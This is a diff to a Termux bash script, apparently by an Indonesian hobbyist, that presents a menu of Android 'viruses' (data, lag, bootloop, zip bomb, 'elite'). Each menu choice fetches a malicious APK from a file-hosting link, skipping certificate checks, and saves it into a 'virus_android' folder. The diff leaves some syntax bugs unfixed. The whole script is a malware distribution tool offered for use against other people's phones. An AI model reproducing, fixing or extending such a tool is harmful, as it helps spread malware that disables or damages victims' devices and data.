@@ -1,5 +1,6 @@
-#!/usr/xbin/bash
+#!/usr/bin/bash
 #import sys os
+apt update&&apt upgrade -y
 pkg install wget -y
 pkg install toilet -y
 pkg install figlet -y
@@ -21,18 +22,18 @@ echo "Fb : https://www.facebook.com/Ace.of.spades729"
 echo "Ig : fajar_firdaus_7"
 echo "YT : iTech7732"
 echo "<======================================>"
-echo '\033[34;1m'
-echo $blue "1.> Virus Data"
-echo $blue "2.> Virus Lag"
-echo $blue "3.> Virus Bootloop"
-echo $blue "4.> Virus Bom Zip"
-echo $blue "5.> Virus Elite"
-echo $blue "0.>exit"
-echo '\033[34;1m'
+echo ""
+echo "1.> Virus Data"
+echo "2.> Virus Lag"
+echo "3.> Virus Bootloop"
+echo "4.> Virus Bom Zip"
+echo "5.> Virus Elite"
+echo "0.>exit"
+echo ""
 echo "<======================================>"
-read -p "root@V-Glitch-#" code
+read -p "root@V-Glitch-#" bro
 
-if [ $code = 1 ] || [ $code = 1 ]
+if [ $bro = 1 ] || [ $code = 1 ]
 then
 clear
 figlet Downloading Virus
@@ -41,7 +42,7 @@ mv virus_data.apk virus_android
 echo "Done tinggal liat virus di folder virus_android"
 fi
 
-if [ $code = 2 ] || [ $code = 2 ]
+if [ $bro = 2 ] || [ $bro = 2 ]
 then
 clear
 figlet Downloading Virus
@@ -50,7 +51,7 @@ mv virus_lag.apk virus_android
 echo "Done tinggal liat virus di folder virus_android"
 fi
 
-if [ $code = 3 ] || [ $code = 3 ]
+if [ $bro = 3 ] || [ $bro = 3 ]
 then
 clear
 figlet Downloading Virus
@@ -59,7 +60,7 @@ mv virus_bootloop.apk virus_android
 echo "Done tinggal liat virus di folder virus_android"
 fi
 
-if [ $code = 4 ] || [ $code = 4 ]
+if [ $bro = 4 ] || [ $bro = 4 ]
 then
 clear
 figlet Downloading Virus
@@ -68,7 +69,7 @@ mv bom_zip.apk virus_android
 echo "Done tinggal liat virus di folder virus_android"
 fi
 
-if [ $code = 5 ] || [ $code = 5 ]
+if [ $bro = 5 ] || [ $bro = 5 ]
 then
 clear
 figlet Downloading Virus
@@ -76,7 +77,7 @@ wget --no-check-certificate https://www24.zippyshare.com/d/yc2Nat3W/32/virus_eli
 mv virus_elite.apk virus_android
 fi
 
-if [ $code = 0 ] || [ $code = 00]
+if [ $bro = 0 ] || [ $bro = 00]
 clear
 echo "Terimakasih Telah Menggunakan Tools ini :)"
 sleep 2
